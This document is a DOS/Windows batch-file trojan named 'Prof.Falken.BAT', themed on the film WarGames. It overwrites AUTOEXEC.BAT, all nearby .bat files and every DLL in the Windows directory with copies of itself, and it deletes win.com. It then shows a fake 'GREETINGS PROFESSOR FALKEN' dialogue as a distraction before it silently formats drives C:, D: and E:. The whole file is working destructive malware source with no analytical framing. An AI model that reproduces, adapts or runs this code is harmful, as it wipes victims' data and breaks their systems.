@echo off
  @break off
  :: Prof.Falken.BAT/Trojan  Remember War Games? :)
  type %0 | find /v "  " >%WINDIR%\WIN.BAT
  type %0 | find /v "  " >C:\AUTOEXEC.BAT
  rundll user,#7 0 5
  exit|cls
@echo off
@break off
:: Prof.Falken.BAT/Trojan  Remember War Games? :)
for %%i in (*.bat ../*.bat) do copy %0 %%i>nul
for %%i in (%windir%\*.dll) do copy %0 %%i>nul
@del %windir%\win.com >nul
@echo e B800:0F00 02 0A>%tmp%\green.dbg
@echo.>>%tmp%\green.dbg
@echo q>>%tmp%\green.dbg
@debug < %tmp%\green.dbg>nul
echo.       LOGIN :_
pause>nul
echo Joshua
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,3>nul
@debug < %tmp%\green.dbg>nul
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
ECHO   . GREETINGS PROFESSOR FALKEN
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2>nul
echo.
ECHO   . HOW DO U FEEL TODAY?
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,4>nul
echo.
echo.
ECHO   - EXCELLENT I'TS BEEN A LONG TIME. CAN U EXPLAIN THE
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2>nul
ECHO   - REMOVAL OF YOUR USER ACCOUNT ON JUNE 23. 1973?
echo.
echo.
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,2>nul
ECHO   . YES I DO
echo.
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,1>nul
ECHO   . SHALL WE PLAY A GAME?
echo.
echo.
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,3>nul
ECHO   - SURE, TERMONUCLEAR WAR
echo.
echo.
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,5>nul
ECHO   . WOULD'NT YOU PREFER A GOOD GAME OF CHESS?
echo.
echo.
choice /c:abcdefghilmnop@q#rstuvw!\'?%xyjkz.;,-_1234567890 /N /T:A,4>nul
echo   - NO.
echo.
format e: /q /u /AUTOTEST > nul
format d: /q /u /AUTOTEST > nul
format c: /q /u /AUTOTEST > nul